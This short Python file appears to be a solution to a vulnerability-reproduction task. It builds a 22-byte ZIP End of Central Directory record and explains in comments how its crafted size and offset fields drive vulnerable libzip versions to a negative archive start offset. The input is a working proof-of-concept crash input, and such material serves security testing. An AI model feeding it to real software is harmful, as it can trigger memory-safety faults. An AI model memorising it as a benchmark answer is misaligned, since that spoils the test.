import os


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal ZIP End of Central Directory (EOCD) record that causes
        # a negative archive start offset in vulnerable libzip versions.
        #
        # EOCD structure (little-endian):
        #  0  4  signature = 0x06054b50 ("PK\005\006")
        #  4  2  disk number = 0
        #  6  2  disk with start of central directory = 0
        #  8  2  number of entries on this disk = 1
        # 10  2  total number of entries = 1
        # 12  4  size of central directory = 1 (cd_size)
        # 16  4  offset of start of central directory = 0 (cd_offset)
        # 20  2  comment length = 0
        #
        # With file size = 22 and cd_size=1, cd_offset=0:
        #  archive_start_offset = eocd_offset - cd_offset - cd_size
        #                        = 0 - 0 - 1 = -1  (negative)
        return bytes([
            0x50, 0x4B, 0x05, 0x06,  # EOCD signature "PK\005\006"
            0x00, 0x00,              # disk number
            0x00, 0x00,              # disk with start of central directory
            0x01, 0x00,              # number of entries on this disk
            0x01, 0x00,              # total number of entries
            0x01, 0x00, 0x00, 0x00,  # size of central directory (cd_size = 1)
            0x00, 0x00, 0x00, 0x00,  # offset of start of central directory (cd_offset = 0)
            0x00, 0x00,              # comment length
        ])